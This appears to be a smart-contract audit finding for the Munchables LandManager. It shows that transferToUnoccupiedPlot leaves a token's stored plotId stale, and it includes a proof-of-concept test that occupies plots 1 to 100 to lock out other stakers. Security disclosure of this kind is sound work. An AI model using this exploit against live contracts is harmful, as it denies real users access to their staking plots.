# Vulnerability details


## Vulnerability Details

Owners of Munchable NFT can transfer their tokens to another unoccupied plot using the `transferToUnoccupiedPlot` function. This function get the current plotId occupied by the token `uint256 oldPlotId = _toiler.plotId;` and empties it `plotOccupied[_toiler.landlord][oldPlotId]`, so the old plot becomes free and the new plot becomes occupied. 

The problem here is that the `toilerState[tokenId].plotId` is not updated to the new plotId, this outdated piece of state can cause a lot of unexpected behavior in the system, a malicious user can exploit this by transfering their tokens to all available plots and thereby blocking everyone else from staking to that landlord.


```sol
 function transferToUnoccupiedPlot(
        uint256 tokenId,
        uint256 plotId
    ) external override forceFarmPlots(msg.sender) notPaused {
        (address mainAccount, ) = _getMainAccountRequireRegistered(msg.sender);
@->     ToilerState memory _toiler = toilerState[tokenId];
@->     uint256 oldPlotId = _toiler.plotId;
        uint256 totalPlotsAvail = _getNumPlots(_toiler.landlord);
        if (_toiler.landlord == address(0)) revert NotStakedError();
        if (munchableOwner[tokenId] != mainAccount) revert InvalidOwnerError();
        if (plotOccupied[_toiler.landlord][plotId].occupied)
            revert OccupiedPlotError(_toiler.landlord, plotId);
        if (plotId >= totalPlotsAvail) revert PlotTooHighError();

        toilerState[tokenId].latestTaxRate = plotMetadata[_toiler.landlord]
            .currentTaxRate;

@->     plotOccupied[_toiler.landlord][oldPlotId] = Plot({
            occupied: false,
            tokenId: 0
        });
        plotOccupied[_toiler.landlord][plotId] = Plot({
            occupied: true,
            tokenId: tokenId
        });

        emit FarmPlotLeave(_toiler.landlord, tokenId, oldPlotId);
        emit FarmPlotTaken(toilerState[tokenId], tokenId);
    }
```

## Proof of Concept

- Landlord has a total of 10 available plots
- Alice token is currently occupying plotId 1
- She transfers it to plotId 2, 3, 4, 5, 6, 7, 8, 9, and 10.
- In each of the transfers the `transferToUnoccupiedPlot` function only frees plotId 1 which is the initial plot her token occupies. Because of this Alice has successfully blocked everyone from occupying any of the landlord's plots except plot 1.

The test below proves the situation, the caller transfers their token from plotId 1 to 100, and this transfer blocks everyone from occupying plotId 1 to 100.

Add the following test to this file https://github.com/code-423n4/2024-07-munchables/blob/main/tests/managers/LandManager/transferToUnoccupiedPlot.test.ts#L174 and run the test


```javascript

    it("transferToUnoccupiedPlot POC", async () => {

      console.log("Transfering from plot id 1 to 100 Will be Successful")

      for (let i = 1; i <= 100; i++) {
        var { request } = await testContracts.landManagerProxy.contract.simulate.transferToUnoccupiedPlot([1, i], {
            account: bob,
          });
        await testClient.writeContract(request);
      }

      console.log("Transfering from plot id 1 to 100 Will be Unsuccessful because they are all occupied")

      for (let i = 1; i <= 100; i++) {
        await assert.rejects(
          testContracts.landManagerProxy.contract.simulate.transferToUnoccupiedPlot([1, i], {
            account: bob,
          }),
          (err: Error) => assertContractFunctionRevertedError(err, "OccupiedPlotError")
        );
      }
    });
```


## Impact
1- A malicious user can spam all of the landlords available plots and make them all occupied, preventing other from using them.

2- Initial plot occupier can make the plot available even though it is currently in use by someone else.
